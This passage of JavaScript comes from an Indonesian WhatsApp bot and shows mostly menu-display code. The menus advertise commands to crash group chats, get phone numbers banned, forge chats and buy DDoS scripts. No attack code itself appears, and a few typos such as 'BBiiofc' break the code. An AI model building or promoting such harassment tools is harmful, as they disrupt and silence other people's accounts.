々 ${prefix}ledakangc *idgroup|jumlah*
々 ${prefix}atomgc *idgroup|jumlah*
々 ${prefix}hancurgc *idgroup|jumlah*
々 ${prefix}bugzirgc *idgroup|jumlah*
々 ${prefix}stuckgc2 *idgroup|jumlah*
々 ${prefix}baugc *idgroup|jumlah*
々 ${prefix}ultigc *idgroup|jumlah*

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: txtv1,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio5.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break

case "bannedmenu":{
const txtv2 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU BANNED* 』
│ ${prefix}call *nomor*
│ ${prefix}out *nomor*
│ ${prefix}verif *nomor*
│ ${prefix}kenon *nomor*
│ ${prefix}bannedv1 *nomor*
│ ${prefix}bannedv2 *nomor*
│ ${prefix}bannedv3 *nomor*
│ ${prefix}bannedv4 *nomor*
│ ${prefix}bannedv5 *nomor*
│ ${prefix}bannedv6 *nomor*
└──────`
reply(txtv2)
}
break
case "unbanmenu":{
const txt226 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU UNBANNED* 』
│ ${prefix}unbannedv1 *nomor*
│ ${prefix}unbannedv2 *nomor*
│ ${prefix}unbannedv3 *nomor*
│ ${prefix}unbannedv4 *nomor*
│ ${prefix}unbannedv5 *nomor*
└──────`
reply(txt226)
}
break
case "topupmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *S U N T I K S O S M E D- M E N U*

々 ${prefix}ceksaldomaupedia
々 ${prefix}list-pascabayar
々 ${prefix}list-prabayar
々 ${prefix}list-sosmed
々 ${prefix}maudeposit
々 ${prefix}topupgame
々 ${prefix}cekgame
々 ${prefix}topup

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "sewabotmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *S E W A B O T - M E N U*

々 ${prefix}buysewainbot
々 ${prefix}listsewa
々 ${prefix}konfirsewa
々 ${prefix}cancelsewa
々 ${prefix}sewa
々 ${prefix}buysewa
々 ${prefix}listsewa

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio3.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "pm2menu": 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*Hi @${sender.split("@")[0]} 👋*
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

𖣂 *P M 2 - M E N U*

々 ${prefix}buycasepm2
々 ${prefix}buyeggpm2
々 ${prefix}buyapipm2
々 ${prefix}buyscpm2

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
      break
case "saldomenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *S A L D O - M E N U*

々 ${prefix}saldonya ( Cek Saldo )
々 ${prefix}tfsaldo ( Jumlah )
々 ${prefix}addsaldo / acc ( Jumlah / Khusus Own)
々 ${prefix}minsaldo (MENGECEK SALDO ORANG LAIN)

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦
`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio3.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "anonymousmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *A N O N Y M O U S - M E N U*

々 ${prefix}confes / menfess

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
  case "suntikmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textoto = `
*ʜᴀʟᴏ ᴋᴀᴋ@${sender.split("@")[0]} 👋*

𖣂 *S U N T I K - M E N U*

々 ${prefix}ᴄᴇᴋsᴀʟᴅᴏ-sᴍᴍ
々 ${prefix}sᴍᴍʟɪsᴛ
々 ${prefix}sᴜɴᴛɪᴋsᴍᴍ _ɪᴅ ʟɪɴᴋ ᴊᴜᴍʟᴀʜ_
々 ${prefix}ᴄᴇᴋsᴛʀᴀɴsᴀᴋsɪ _ɪᴅ ᴏʀᴅᴇʀ_
々 ${prefix}ᴅᴇᴘᴏsɪᴛ-sᴍᴍ _ᴊᴜᴍʟᴀʜ ᴅᴇᴘᴏ_

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textoto,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄 - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "cmdmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textoto = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *B U Y S C - M E N U*

┌ ◦ ${prefix}buyscbugv1
 々 ${prefix}buyscbugv2
 々 ${prefix}buyscbugv3
 々 ${prefix}buyscv2
 々 ${prefix}buyscv3
 々 ${prefix}buyscv3subdo
 々 ${prefix}buyscv4
 々 ${prefix}buyscv5
 々 ${prefix}buyscv6
 々 ${prefix}buyscv6subdo
 々 ${prefix}buyscv7otp
 々 ${prefix}buyscv7addpm2
 々 ${prefix}buyscv8
 々 ${prefix}buyscjagagrupv1
 々 ${prefix}buyscjagagrupv2
 々 ${prefix}buyscpushkontak
 々 ${prefix}buyschwv191
 々 ${prefix}buyschwv192
 々 ${prefix}buyschwv201
 々 ${prefix}buyschwv202
 々 ${prefix}buyschwv21noscan
 々 ${prefix}buyschwv21
 々 ${prefix}buyscnoscan
 々 ${prefix}buyscscan
 々 ${prefix}buyscpanel
 々 ${prefix}buyscpushautosave
 々 ${prefix}buyscjpmv1
 々 ${prefix}buyscjpmv2
 々 ${prefix}buyscjpmv3
 々 ${prefix}buyscvps1
 々 ${prefix}buyscvps2
 々 ${prefix}buyscpm2 
 々 ${prefix}buyscthemav1
 々 ${prefix}buyscthemav2
 々 ${prefix}buyscnowa
 々 ${prefix}buyscwebp
 々 ${prefix}buysctesmoni
 々 ${prefix}buyscddos
 々 ${prefix}buymodule
└ ◦ ${prefix}buyscbukaenc

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textoto,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "paymentmenu": case "paymenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textoto = `
*Hi @${sender.split("@")[0]} 👋*

*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

𖣂 *P A Y M E N T - M E N U*

々 ${prefix}dana
々 ${prefix}gopay
々 ${prefix}orkut
々 ${prefix}qris
々 ${prefix}bri

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textoto,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio3.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
   case "textwamenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textbi = `
*Hi @${sender.split("@")[0]} 👋*


┌ ◦ ${prefix}ғᴀᴋᴇᴄ1
々 ${prefix}ғᴀᴋᴇᴄ2
々 ${prefix}ғᴀᴋᴇᴄ3
々 ${prefix}ғᴀᴋᴇᴄ4
々 ${prefix}ғᴀᴋᴇᴄ5
々 ${prefix}ғᴀᴋᴇᴄ6
々 ${prefix}ғᴀᴋᴇᴄ7
々 ${prefix}ғᴀᴋᴇᴄ8
々 ${prefix}ғᴀᴋᴇᴄ9
々 ${prefix}ғᴀᴋᴇᴄ10
々 ${prefix}ғᴀᴋᴇᴄ11
々 ${prefix}ғᴀᴋᴇᴄɴ1
々 ${prefix}ғᴀᴋᴇᴄɴ2
々 ${prefix}ᴀʟʟᴛᴏᴛᴀʟ
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ1
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ2
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ3
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ4
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ5
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ6
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ7
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ8
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ9
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ10
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ11
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ12
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ13
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ14
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ15
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ16
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ17
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ18
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ19
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ20
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ21
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍv1
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍv2
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍv3
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍv4
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍv5
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ1
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ2
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ3
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ4
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ5
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ6
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ7
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ8
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ9
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ10
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ11
└ ◦ ${prefix}ᴛᴇxᴛʙᴀɴᴠ12

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textbi,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio3.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "filesc": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *F I L E S C ッ*


ReadMe.txt
Sc+v9.zip
all
appearance.js
connect.js
database
freya
node_modules
package-lock.json
package.json
scrape
session
thumb.png
v9²
xeonmedia
wangsap
`
BBiiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "randommenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *R A N D O M - M E N U*

々 ${prefix}randomcecan1
々 ${prefix}randomcecan2
々 ${prefix}randomcecan3
々 ${prefix}randomcecan4
々 ${prefix}randomcecan5
々 ${prefix}randomcecan6
々 ${prefix}randomcecan7
々 ${prefix}randomcecan8
々 ${prefix}randomcecan9
々 ${prefix}randomcecan10

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: `Shinzu MultiDevice`,
      body: `Whatsapp`,
      thumbnail: 'thumbnail1',
      sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "tiktokrandomenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*      

𖣂 *T I K T O K - M E N U*

々 ${prefix}tiktokgirl
々 ${prefix}tiktokghea
々 ${prefix}tiktokbocil
々 ${prefix}tiktoknukhty
々 ${prefix}tiktoksantuy
々 ${prefix}tiktokkayes
々 ${prefix}tiktokpanrika
々 ${prefix}tiktoknotnot
々 ${prefix}chinese
々 ${prefix}hijab
々 ${prefix}indo
々 ${prefix}japanese
々 ${prefix}korean
々 ${prefix}malay
々 ${prefix}randomgirl
々 ${prefix}randomboy
々 ${prefix}thai
々 ${prefix}vietnamese
々 ${prefix}aesthetic
々 ${prefix}antiwork
々 ${prefix}blackpink
々 ${prefix}bike
々 ${prefix}boneka
々 ${prefix}cosplay
々 ${prefix}cat
々 ${prefix}doggo
々 ${prefix}justina
々 ${prefix}kayes
々 ${prefix}kpop
々 ${prefix}notnot

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦` 
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio2.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
  case "otomatismenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *O T O M A T I S - M E N U*

々 ${prefix}buysc
々 ${prefix}buyvps
々 ${prefix}buysrv 
々 ${prefix}deposit
々 ${prefix}buyprem
々 ${prefix}buyowner

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnail: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break 

case "domainmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *D O M A I N - M E N U*

々 ${prefix}subdomain 
々 ${prefix}addgc
々 ${prefix}delgc

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case 'subdomain':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `
*Hi @${sender.split("@")[0]} 👋*} 👋*

𖣂 *L I S T - S U B D O M A I N*

┌ ◦ domain1 panellstore.com
々 ${prefix}domain2 panellstore.net
々 ${prefix}domain3 panellstore.icu
々 ${prefix}domain4 panellstore.xyz
々 ${prefix}domain5 panellstore.art
々 ${prefix}domain6 panellkuu.com
々 ${prefix}domain7 jasa-panel.my.id 
々 ${prefix}domain8 didinsec.biz.id 
々 ${prefix}domain9 putraoffc.cfd 
々 ${prefix}domain10 sellerpannel.my.id 
々 ${prefix}domain11 pannelku.icu
々 ${prefix}domain12 pannelku.cfd
々 ${prefix}domain13 putraoffc.site
々 ${prefix}domain14 putraoffc.com 
々 ${prefix}domain15 kangpannel.xyz 
々 ${prefix}domain16 mypannelku.com 
々 ${prefix}domain17 pannelmurah.xyz
々 ${prefix}domain18 storepannel.xyz
々 ${prefix}domain19 tokopannel.xyz
々 ${prefix}domain20 mypannel.cfd
々 ${prefix}domain21 adminpannel.xyz
々 ${prefix}domain22 mypannel.icu
々 ${prefix}domain23 tokocpannelmurah.xyz
々 ${prefix}domain24 websitepannelmurah.com
々 ${prefix}domain25 panellku.my.id
々 ${prefix}domain26 panellku.me 
々 ${prefix}domain27 panellku.biz.id 
々 ${prefix}domain28 panellku.tech 
々 ${prefix}domain29 panelkuu.xyz
々 ${prefix}domain30 panellku.com
々 ${prefix}domain31 biistoreee.tech
々 ${prefix}domain32 biistoreee.xyz 
々 ${prefix}domain33 rulzxyxd.com 
々 ${prefix}domain34 rafatharoffc.dev
々 ${prefix}domain35 rafatharoffcial.dev
々 ${prefix}domain36 rizalshop.my.id
々 ${prefix}domain37 panelku.link
々 ${prefix}domain38 sanzyy.xyz
々 ${prefix}domain39 home-panel.pw ( prem )
々 ${prefix}domain40 aswinxd.me
々 ${prefix}domain41 panel-zall.me ( prem )
々 ${prefix}domain42 digital-market.me
々 ${prefix}domain43 rafatharofficial.my.id
々 ${prefix}domain44 tokodigital.software
々 ${prefix}domain45 agen-panell.tech ( prem )
々 ${prefix}domain46 privateyour.me ( owner )
々 ${prefix}domain47 crazyyhosting.xyz
々 ${prefix}domain48 servershop.biz.id
々 ${prefix}domain49 rumahpanel.xyz ( prem ) 
々 ${prefix}domain50 controlpanel.site ( prem )
々 ${prefix}domain51 sellerpanel.me ( prem )
々 ${prefix}domain52 panelstoree.tech ( prem )
々 ${prefix}domain53 toko-pannelmurah.biz.id ( prem )
々 ${prefix}domain54 vvip-pannel.online ( prem ) 
々 ${prefix}domain55 rafatharoffcial-private.me ( prem )
々 ${prefix}domain56 amaliasyva-private.tech ( prem )
々 ${prefix}domain57 kangpane.me ( prem )
々 ${prefix}domain58 rizalxalfi.com ( prem )

